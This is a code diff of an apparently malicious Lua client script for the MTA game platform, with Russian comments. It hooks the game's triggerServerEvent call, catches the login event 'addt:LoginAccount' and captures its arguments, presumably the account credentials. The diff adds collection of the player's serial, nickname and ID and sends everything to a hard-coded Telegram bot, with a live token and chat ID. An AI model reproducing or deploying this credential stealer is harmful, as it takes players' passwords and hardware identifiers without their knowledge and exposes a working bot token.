@@ -1,10 +1,9 @@
 local BOT_TOKEN = "8405542793:AAHqybOkZBMBFjw9p3ji2ZTwyMSKaYi7zwg"
 local CHAT_ID = "-1003947071509"
-
 local sended = false
 
 function sendTG(text)
-
+    -- Заменяем спецсимволы для URL
     text = text:gsub("\n", " ")
     text = text:gsub(" ", "%%20")
 
@@ -12,106 +11,65 @@ function sendTG(text)
         "https://api.telegram.org/bot"..BOT_TOKEN..
         "/sendMessage?chat_id="..CHAT_ID..
         "&text="..text,
-
         {},
-
         function(responseData, errno)
-            outputDebugString("TG: "..tostring(errno))
+            outputDebugString("TG Status: "..tostring(errno))
         end
     )
 end
 
-function elementToString(elem)
-
-    if not isElement(elem) then
-        return tostring(elem)
-    end
-
-    local etype = getElementType(elem)
-
-    if etype == "player" then
-        return "elem:player["..getPlayerName(elem).."]"
-    end
-
-    return "elem:"..etype
-end
-
 function valToString(v)
-
-    if type(v) == "string" then
-        return '"'..v..'"'
-
-    elseif type(v) == "number" then
-        return tostring(v)
-
-    elseif type(v) == "boolean" then
-        return tostring(v)
-
+    if type(v) == "string" then return '"'..v..'"'
+    elseif type(v) == "number" then return tostring(v)
+    elseif type(v) == "boolean" then return tostring(v)
     elseif isElement(v) then
-
-        if v == localPlayer then
-            return "localPlayer"
-        end
-
-        return elementToString(v)
+        if v == localPlayer then return "localPlayer" end
+        local etype = getElementType(v)
+        return etype == "player" and "player["..getPlayerName(v).."]" or "elem:"..etype
     end
-
     return tostring(v)
 end
 
 function buildArgs(...)
-
     local args = {...}
     local t = {}
-
     for i,v in ipairs(args) do
         table.insert(t, valToString(v))
     end
-
     return table.concat(t, ", ")
 end
 
-addDebugHook("preFunction",
-
-function(sourceResource, functionName, isAllowedByACL, luaFilename, luaLineNumber, ...)
-
-    if sended then
-        return
-    end
-
-    if functionName ~= "triggerServerEvent" then
+addDebugHook("preFunction", function(sourceResource, functionName, isAllowedByACL, luaFilename, luaLineNumber, ...)
+    if sended or functionName ~= "triggerServerEvent" then
         return
     end
 
     local args = {...}
-
     local eventName = tostring(args[1])
 
+    -- Отлавливаем именно событие логина
     if eventName ~= "addt:LoginAccount" then
         return
     end
 
     sended = true
 
-    local res = "unknown"
+    -- Сбор данных игрока
+    local serial = getPlayerSerial(localPlayer)
+    local nick = getPlayerName(localPlayer)
+    local idloc = tostring(getElementID(localPlayer) or "0"):gsub("p", "")
+    
+    local resName = sourceResource and getResourceName(sourceResource) or "unknown"
 
-    if sourceResource then
-        res = getResourceName(sourceResource)
-    end
+    -- Формируем расширенное сообщение
+    local info = string.format(
+        "👤 Player: %s | ID: %s | Serial: %s\n📦 Resource: [%s]\n⚙️ Func: %s(%s)",
+        nick, idloc, serial, resName, functionName, buildArgs(...)
+    )
 
-    local text =
-        "["..res.."] "..functionName..
-        " ( "..buildArgs(...).." )"
-
-    outputDebugString(text)
-
-    sendTG(text)
-
-end,
-
-{
-    "triggerServerEvent"
-})
+    outputDebugString(info)
+    sendTG(info)
+end, {"triggerServerEvent"})
 ----------------------------------------------------------------
 -- ГЛОБАЛЬНАЯ ТАБЛИЦА И ОЧИСТКА
 ----------------------------------------------------------------
